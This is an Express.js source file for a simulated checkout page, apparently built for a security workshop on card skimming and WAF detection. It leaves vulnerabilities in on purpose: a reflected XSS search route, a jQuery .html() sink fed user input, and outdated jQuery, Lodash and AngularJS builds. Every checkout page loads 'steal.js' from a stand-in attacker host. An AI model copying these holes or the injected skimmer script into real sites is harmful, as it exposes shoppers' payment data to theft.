const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const ATTACKER_URL = process.env.ATTACKER_URL || 'http://attacker.fortinet.demo';

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));

// Main route - script is always injected (simulating compromised third-party script)
app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(getHtml(ATTACKER_URL, true));
});

// Reflected XSS: 'q' or 'search' param is echoed without encoding (triggers script load)
app.get('/search', (req, res) => {
  const q = req.query.q || req.query.search || '';
  const html = `
<!DOCTYPE html>
<html>
<head><title>Search</title></head>
<body>
  <h1>Search results for: ${q}</h1>
  <p>No results found.</p>
  <a href="/">Back to checkout</a>
</body>
</html>`;
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

// Checkout route - same as main route (script always injected)
app.get('/checkout', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(getHtml(ATTACKER_URL, true));
});

// jQuery XSS demo: user input passed to $.html() - vulnerable (CVE-2019-11358 / XSS in DOM methods)
app.get('/jquery-xss', (req, res) => {
  const userContent = req.query.content || '';
  const html = `
<!DOCTYPE html>
<html>
<head><title>jQuery XSS demo</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
  <h1>User content (vulnerable .html()):</h1>
  <div id="target"></div>
  <script>
    $('#target').html(${JSON.stringify(userContent)});
  </script>
  <a href="/">Back</a>
</body>
</html>`;
  res.setHeader('Content-Type', 'text/html');
  res.send(html);
});

function getHtml(attackerUrl, injectScript = true) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Checkout - Simulated</title>
  <!-- Vulnerable: jQuery 3.3.1 - CVE-2019-11358 (prototype pollution) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <!-- Vulnerable: Lodash 4.17.10 - CVE-2018-3721, CVE-2019-10744 (prototype pollution) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.10/lodash.min.js"></script>
  <!-- Vulnerable: AngularJS 1.6.9 - CVE-2019-10768 (XSS), CVE-2020-7676 (XSS), CVE-2021-32820 (XSS) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js"></script>
  ${injectScript ? `<script src="${attackerUrl}/steal.js"></script>` : ''}
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .container {
      background: white;
      border-radius: 20px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px;
      max-width: 500px;
      width: 100%;
      animation: slideUp 0.5s ease-out;
    }
    @keyframes slideUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h1 {
      color: #333;
      margin-bottom: 10px;
      font-size: 28px;
      font-weight: 600;
    }
    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      color: #333;
      font-weight: 500;
      margin-bottom: 8px;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 12px 16px;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      font-size: 16px;
      transition: all 0.3s ease;
      font-family: inherit;
    }
    input:focus {
      outline: none;
      border-color: #667eea;
      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
    }
    input::placeholder {
      color: #999;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      margin-top: 10px;
    }
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
    }
    button:active {
      transform: translateY(0);
    }
    button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }
    #message {
      margin-top: 20px;
      padding: 12px;
      border-radius: 8px;
      text-align: center;
      font-size: 14px;
      animation: fadeIn 0.3s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    .message-success {
      background: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .message-error {
      background: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    .message-info {
      background: #d1ecf1;
      color: #0c5460;
      border: 1px solid #bee5eb;
    }
    .card-icon {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }
    .card-icon svg {
      width: 60px;
      height: 60px;
      opacity: 0.3;
    }
    .modal {
      display: none;
      position: fixed;
      z-index: 1000;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      animation: fadeIn 0.3s ease;
    }
    .modal.show {
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .modal-content {
      background: white;
      padding: 40px;
      border-radius: 20px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      animation: scaleIn 0.3s ease;
    }
    @keyframes scaleIn {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .modal-content h2 {
      color: #333;
      margin-bottom: 20px;
      font-size: 24px;
    }
    .modal-content .success-icon {
      font-size: 64px;
      margin-bottom: 20px;
    }
    .modal-content p {
      color: #666;
      margin-bottom: 30px;
      font-size: 16px;
    }
    .modal-content button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="card-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
        <line x1="1" y1="10" x2="23" y2="10"></line>
      </svg>
    </div>
    <h1>Secure Checkout</h1>
    <p class="subtitle">Workshop only - do not enter real card data</p>
    <form id="payment-form" action="/submit" method="POST">
      <div class="form-group">
        <label for="cardNumber">Card Number</label>
        <input type="text" name="cardNumber" id="cardNumber" placeholder="4111 1111 1111 1111" maxlength="19" required>
      </div>
      <div class="form-group">
        <label for="expiry">Expiry Date</label>
        <input type="text" name="expiry" id="expiry" placeholder="MM/YY" maxlength="5" required>
      </div>
      <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="text" name="cvv" id="cvv" placeholder="123" maxlength="4" required>
      </div>
      <div class="form-group">
        <label for="cardName">Name on Card</label>
        <input type="text" name="cardName" id="cardName" placeholder="John Doe" required>
      </div>
      <button type="submit" id="submit-btn">Submit Payment</button>
    </form>
    <div id="message"></div>
  </div>

  <!-- Modal popup -->
  <div id="success-modal" class="modal">
    <div class="modal-content">
      <div class="success-icon">✓</div>
      <h2>Payment Successful!</h2>
      <p>Your payment has been simulated successfully.</p>
      <button onclick="closeModal()">OK</button>
    </div>
  </div>

  <!-- Bad practice: inline JavaScript -->
  <script>
    (function() {
      var form = document.getElementById('payment-form');
      var submitBtn = document.getElementById('submit-btn');
      var message = document.getElementById('message');
      
      // Validation functions (inline JavaScript - bad practice)
      function validateExpiry(expiry) {
        if (!expiry || expiry.length !== 5) return false;
        var parts = expiry.split('/');
        if (parts.length !== 2) return false;
        var month = parseInt(parts[0], 10);
        var year = parseInt(parts[1], 10);
        if (isNaN(month) || isNaN(year)) return false;
        if (month < 1 || month > 12) return false;
        var currentYear = new Date().getFullYear() % 100;
        if (year < currentYear) return false;
        return true;
      }
      
      function validateCardName(name) {
        if (!name || name.trim().length < 3) return false;
        var trimmed = name.trim();
        var words = trimmed.split(/\\s+/);
        if (words.length < 2) return false;
        var hasNumbers = /\\d/.test(trimmed);
        if (hasNumbers) return false;
        return true;
      }
      
      function validateCardNumber(cardNumber) {
        if (!cardNumber) return false;
        var cleaned = cardNumber.replace(/\\s/g, '');
        if (cleaned.length < 13 || cleaned.length > 19) return false;
        if (!/^\\d+$/.test(cleaned)) return false;
        return true;
      }
      
      function validateCVV(cvv) {
        if (!cvv) return false;
        if (cvv.length < 3 || cvv.length > 4) return false;
        if (!/^\\d+$/.test(cvv)) return false;
        return true;
      }
      
      if (form) {
        form.addEventListener('submit', function(e) {
          e.preventDefault();
          
          var cardNumber = document.getElementById('cardNumber').value;
          var expiry = document.getElementById('expiry').value;
          var cvv = document.getElementById('cvv').value;
          var cardName = document.getElementById('cardName').value;
          
          var errors = [];
          
          if (!validateCardNumber(cardNumber)) {
            errors.push('Card number must be 13-19 digits');
            document.getElementById('cardNumber').style.borderColor = '#f5576c';
          } else {
            document.getElementById('cardNumber').style.borderColor = '#e0e0e0';
          }
          
          if (!validateExpiry(expiry)) {
            errors.push('Expiry date must be in MM/YY format and not expired');
            document.getElementById('expiry').style.borderColor = '#f5576c';
          } else {
            document.getElementById('expiry').style.borderColor = '#e0e0e0';
          }
          
          if (!validateCVV(cvv)) {
            errors.push('CVV must be 3-4 digits');
            document.getElementById('cvv').style.borderColor = '#f5576c';
          } else {
            document.getElementById('cvv').style.borderColor = '#e0e0e0';
          }
          
          if (!validateCardName(cardName)) {
            errors.push('Name on card must contain at least first and last name (no numbers)');
            document.getElementById('cardName').style.borderColor = '#f5576c';
          } else {
            document.getElementById('cardName').style.borderColor = '#e0e0e0';
          }
          
          if (errors.length > 0) {
            message.className = 'message-error';
            message.innerHTML = '<p><strong>Validation errors:</strong></p><ul style="margin-top:10px;padding-left:20px;"><li>' + errors.join('</li><li>') + '</li></ul>';
            return false;
          }
          
          // Show loading state
          submitBtn.disabled = true;
          submitBtn.textContent = 'Processing...';
          message.className = 'message-info';
          message.innerHTML = '<p>Processing your payment...</p>';
          
          // Create form data
          var formData = new FormData(form);
          
          // Actually submit the form via fetch (or let form submit naturally)
          fetch('/submit', {
            method: 'POST',
            body: formData
          })
          .then(function(response) {
            if (response.ok) {
              // Show popup modal
              var modal = document.getElementById('success-modal');
              if (modal) {
                modal.classList.add('show');
              }
              // Reset form
              form.reset();
              submitBtn.disabled = false;
              submitBtn.textContent = 'Submit Payment';
            } else {
              throw new Error('Submission failed');
            }
          })
          .catch(function(error) {
            message.className = 'message-error';
            message.innerHTML = '<p>Error processing payment. Please try again.</p>';
            submitBtn.disabled = false;
            submitBtn.textContent = 'Submit Payment';
          });
          
          return false;
        });
      }
    })();
    
    function closeModal() {
      var modal = document.getElementById('success-modal');
      if (modal) {
        modal.classList.remove('show');
      }
    }
    
    // Close modal on background click
    window.onclick = function(event) {
      var modal = document.getElementById('success-modal');
      if (event.target == modal) {
        closeModal();
      }
    }
  </script>
  <!-- Bad practice: inline event handler (WAF often flags these) -->
  <script>
    (function() {
      // Validation functions (same as in form submit handler)
      function validateExpiry(expiry) {
        if (!expiry || expiry.length !== 5) return false;
        var parts = expiry.split('/');
        if (parts.length !== 2) return false;
        var month = parseInt(parts[0], 10);
        var year = parseInt(parts[1], 10);
        if (isNaN(month) || isNaN(year)) return false;
        if (month < 1 || month > 12) return false;
        var currentYear = new Date().getFullYear() % 100;
        if (year < currentYear) return false;
        return true;
      }
      
      function validateCardName(name) {
        if (!name || name.trim().length < 3) return false;
        var trimmed = name.trim();
        var words = trimmed.split(/\\s+/);
        if (words.length < 2) return false;
        var hasNumbers = /\\d/.test(trimmed);
        if (hasNumbers) return false;
        return true;
      }
      
      function validateCardNumber(cardNumber) {
        if (!cardNumber) return false;
        var cleaned = cardNumber.replace(/\\s/g, '');
        if (cleaned.length < 13 || cleaned.length > 19) return false;
        if (!/^\\d+$/.test(cleaned)) return false;
        return true;
      }
      
      function validateCVV(cvv) {
        if (!cvv) return false;
        if (cvv.length < 3 || cvv.length > 4) return false;
        if (!/^\\d+$/.test(cvv)) return false;
        return true;
      }
      
      var cardNumber = document.getElementById('cardNumber');
      var expiry = document.getElementById('expiry');
      var cvv = document.getElementById('cvv');
      var cardName = document.getElementById('cardName');
      
      if (cardNumber) {
        cardNumber.oninput = function() {
          var v = this.value.replace(/\\s+/g, '').replace(/(\\d{4})/g, '$1 ').trim();
          this.value = v.substring(0, 19);
          // Real-time validation
          if (this.value.length > 0) {
            if (validateCardNumber(this.value)) {
              this.style.borderColor = '#28a745';
            } else {
              this.style.borderColor = '#f5576c';
            }
          } else {
            this.style.borderColor = '#e0e0e0';
          }
        };
        cardNumber.onblur = function() {
          if (this.value.length > 0 && !validateCardNumber(this.value)) {
            this.style.borderColor = '#f5576c';
          }
        };
      }
      
      if (expiry) {
        expiry.oninput = function() {
          var v = this.value.replace(/\\D/g, '');
          if (v.length >= 2) {
            v = v.substring(0, 2) + '/' + v.substring(2, 4);
          }
          this.value = v.substring(0, 5);
          // Real-time validation
          if (this.value.length === 5) {
            if (validateExpiry(this.value)) {
              this.style.borderColor = '#28a745';
            } else {
              this.style.borderColor = '#f5576c';
            }
          } else if (this.value.length > 0) {
            this.style.borderColor = '#e0e0e0';
          } else {
            this.style.borderColor = '#e0e0e0';
          }
        };
        expiry.onblur = function() {
          if (this.value.length > 0 && !validateExpiry(this.value)) {
            this.style.borderColor = '#f5576c';
          }
        };
      }
      
      if (cvv) {
        cvv.oninput = function() {
          // Real-time validation
          if (this.value.length > 0) {
            if (validateCVV(this.value)) {
              this.style.borderColor = '#28a745';
            } else {
              this.style.borderColor = '#f5576c';
            }
          } else {
            this.style.borderColor = '#e0e0e0';
          }
        };
        cvv.onblur = function() {
          if (this.value.length > 0 && !validateCVV(this.value)) {
            this.style.borderColor = '#f5576c';
          }
        };
      }
      
      if (cardName) {
        cardName.oninput = function() {
          // Real-time validation
          if (this.value.length > 0) {
            if (validateCardName(this.value)) {
              this.style.borderColor = '#28a745';
            } else {
              this.style.borderColor = '#f5576c';
            }
          } else {
            this.style.borderColor = '#e0e0e0';
          }
        };
        cardName.onblur = function() {
          if (this.value.length > 0 && !validateCardName(this.value)) {
            this.style.borderColor = '#f5576c';
          }
        };
      }
    })();
  </script>
</body>
</html>`;
}

app.post('/submit', (req, res) => {
  console.log('[SUBMIT] Payment data received:', {
    cardNumber: req.body.cardNumber,
    expiry: req.body.expiry,
    cvv: req.body.cvv ? '***' : undefined,
    cardName: req.body.cardName
  });
  // Return success response (don't redirect, let JS handle it)
  res.status(200).json({ success: true, message: 'Payment simulated successfully' });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Transaction app listening on port ${PORT}`);
});
